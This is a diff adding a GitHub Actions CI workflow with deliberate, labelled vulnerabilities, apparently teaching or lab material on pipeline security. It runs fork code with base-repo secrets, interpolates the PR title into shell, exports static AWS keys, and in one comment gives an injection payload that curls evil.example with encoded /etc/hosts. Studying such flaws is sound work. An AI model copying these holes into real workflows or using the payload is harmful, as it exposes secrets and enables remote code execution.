@@ -1,0 +1,62 @@
+name: CI
+
+# VULN-4a: pull_request_target runs with the BASE repo's permissions/secrets
+# even when triggered by a fork's PR, unlike plain pull_request.
+on:
+  pull_request_target:
+    branches: [main]
+  push:
+    branches: [main]
+
+# VULN-3: no top-level `permissions:` block set here, so GITHUB_TOKEN
+# defaults to broad read/write access on classic repo settings.
+
+jobs:
+  build-and-test:
+    runs-on: ubuntu-latest
+    steps:
+      # VULN-4a (continued): checking out the PR's HEAD ref means we build
+      # and run whatever code the fork author pushed, but with base-repo
+      # secrets and token permissions available to it.
+      - name: Checkout PR head
+        uses: actions/checkout@v3
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      # VULN-1: third-party action pinned to a mutable tag (v3) instead of
+      # a full commit SHA. If that tag is ever repointed (maintainer
+      # account compromise, malicious update), you silently pull new code.
+      - name: Setup Node
+        uses: actions/setup-node@v3
+        with:
+          node-version: "20"
+
+      - name: Install dependencies
+        run: npm install
+
+      # VULN-4b: untrusted PR title is interpolated directly into a shell
+      # command via a GitHub Actions expression. A PR titled
+      #   "; curl http://evil.example/$(cat /etc/hosts | base64) #
+      # gets executed verbatim in this runner's shell (classic GitHub
+      # Actions script-injection pattern).
+      - name: Announce build
+        run: echo "Building for PR ${{ github.event.pull_request.title }}"
+
+      - name: Run tests
+        run: npm test
+
+      # VULN-2: long-lived cloud credentials stored as static repo secrets
+      # and exported directly into the environment, instead of using
+      # short-lived credentials via OIDC federation. If this token or the
+      # secret leaks (e.g. via VULN-4b above), it's valid until manually
+      # rotated.
+      - name: Deploy (simulated)
+        env:
+          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+        run: echo "Pretending to deploy with static AWS credentials..."
+
+# VULN-5 isn't in this file at all - it's the ABSENCE of branch protection
+# on `main` requiring review for changes to files under .github/workflows/,
+# which means anyone with push access (or a merged malicious PR) can alter
+# the pipeline's own logic and permissions.
